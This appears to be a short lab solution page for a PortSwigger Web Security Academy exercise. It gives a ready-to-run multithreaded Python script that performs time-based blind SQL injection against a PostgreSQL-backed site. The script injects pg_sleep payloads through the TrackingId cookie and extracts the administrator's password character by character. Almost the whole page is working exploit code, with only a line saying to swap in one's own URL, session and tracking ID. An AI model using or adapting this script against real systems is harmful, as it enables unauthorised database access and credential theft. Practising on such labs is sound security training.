# Blind Time Based SQL Injection - MultiThreading

***Time Based Blind SQL Injection - MultiThreading***

Must Change Variables - `URL / Session / TrackingId`

PostgreSQL Database

```python
import requests
import string
from concurrent.futures import ThreadPoolExecutor
import time

def multiThreading():
    
    ts = time.perf_counter()
    session = requests.Session()
    
    url = "https://0aae008404453505861c7ae7002f00b1.web-security-academy.net/"
    chars = string.digits + string.ascii_letters
    index = list(range(1,21))
    password = ""

    def Threads(wordlist):
        for char in chars:
            cookies = {
                "session": "Epi0ZPyJm1Bhbz3mFyWIiT1WARHt4FF",
                "TrackingId": f"'%3b SELECT CASE WHEN (SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(password, {wordlist}, 1) = '{char}') = 1 THEN pg_sleep(10) ELSE pg_sleep(0) END-- -"
            }
            req = session.get(url, cookies=cookies)
            if req.elapsed.total_seconds() >= 10:
                return char
        return ""

    with ThreadPoolExecutor(max_workers=1000) as executor:
        processes = executor.map(Threads,index)

    
    password = ''.join(processes)

    te = time.perf_counter()

    print(f"[+] Password extracted: {password}")
    print(f"[+] Time taken: {te - ts:.2f} seconds")

multiThreading()
```